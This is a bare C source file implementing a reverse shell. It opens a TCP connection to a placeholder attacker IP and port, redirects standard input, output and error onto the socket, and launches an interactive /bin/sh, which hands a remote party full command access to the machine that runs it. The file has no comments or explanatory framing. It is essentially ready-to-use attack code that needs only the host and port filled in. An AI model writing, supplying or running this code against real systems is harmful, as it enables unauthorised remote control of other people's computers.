#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>

#define IP <ATTACKER_IP>
#define PORT <ATTACKER_PORT>

int main(int argc, char **argv){

  struct sockaddr_in server;
  int sd;

  server.sin_family = AF_INET;
  server.sin_addr.s_addr = inet_addr(IP);
  server.sin_port = htons(PORT);

  sd = socket(AF_INET,SOCK_STREAM,0);

  connect(sd,(struct sockaddr *)&server,sizeof(server));

  dup2(sd,0);
  dup2(sd,1);
  dup2(sd,2);

  execl("/bin/sh","sh","-i",NULL,NULL);

  return 0;
}
